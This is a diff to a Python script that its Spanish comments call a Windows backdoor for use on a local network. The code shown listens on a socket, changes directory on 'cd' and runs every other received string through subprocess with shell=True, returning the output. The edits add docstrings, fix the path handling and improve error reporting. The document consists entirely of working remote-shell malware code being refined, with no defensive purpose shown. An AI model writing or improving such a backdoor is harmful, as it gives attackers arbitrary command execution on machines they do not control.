@@ -3,11 +3,13 @@ import socket
 import os
 import threading
 import platform
+from re import match
 
 # codigo para puerta trasera (solo windows)
 # pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
 
 def IPV4():
+    'intenta obtener la direccion ipv4 de la maquina'
     try:
         
         s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
@@ -19,16 +21,19 @@ def IPV4():
         exit(1)
 
 def escucha(cliente):
+    'interpreta los comandos recibidos'
     try:
-        señal = cliente.recv(1024).decode().lower().split(' ')
-        if señal[0] == 'cd':
+        señal = cliente.recv(1024).decode()
+        if match('cd ',señal.lower()):
+            ruta = señal[2:]
             try:
-                os.chdir(señal[-1])
-                cliente.send(f'[!] nueva ruta>> {señal[-1]}\n'.encode())
-            except:
-                cliente.send('\n[!] error cambiando el directorio de trabajo\n'.encode())
+                os.chdir(ruta.strip())
+
+                cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
+            except Exception as e:
+                cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
         else:
-            comando = subprocess.check_output(señal,text=True,shell=True)
+            comando = subprocess.check_output(señal.split(' '),text=True,shell=True)
             cliente.send(comando.encode())
     except ConnectionResetError:
         main()
@@ -37,7 +42,7 @@ def escucha(cliente):
 
 def main():
 
-    
+    'funcion principal del codigo'
 
     n = 0
     while ejecucion:
